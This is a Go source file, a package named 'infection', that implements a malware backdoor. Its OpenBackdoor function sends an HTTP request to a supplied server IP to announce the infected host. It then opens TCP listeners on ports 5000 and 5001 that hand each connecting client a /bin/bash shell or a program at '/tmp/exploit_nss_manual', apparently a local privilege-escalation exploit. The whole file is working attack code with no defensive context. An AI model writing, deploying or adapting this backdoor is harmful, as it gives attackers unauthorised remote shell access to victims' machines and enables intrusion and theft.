package infection

import (
    "net"
	"net/http"
    "os/exec"
)

func handleConnection(connection net.Conn, addr string) {
	command := ""
	if addr == "0.0.0.0:5000" {
		command = "/tmp/exploit_nss_manual"
	} else if addr == "0.0.0.0:5001" {
		command = "/bin/bash"
	}
	cmd := exec.Command(command)
    cmd.Stdin = connection
    cmd.Stdout = connection
    cmd.Stderr = connection
    cmd.Run()
}

func SendIp(serverIp string) {
	http.Get("http://"+serverIp)
}

func Listen(addr string) {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return
    }
	for {
        connection, err := listener.Accept()
        if err == nil {
			go handleConnection(connection,addr) 
        }
    }

}

func OpenBackdoor(serverIp string) {
	SendIp(serverIp)
	go Listen("0.0.0.0:5000")
	go Listen("0.0.0.0:5001")
}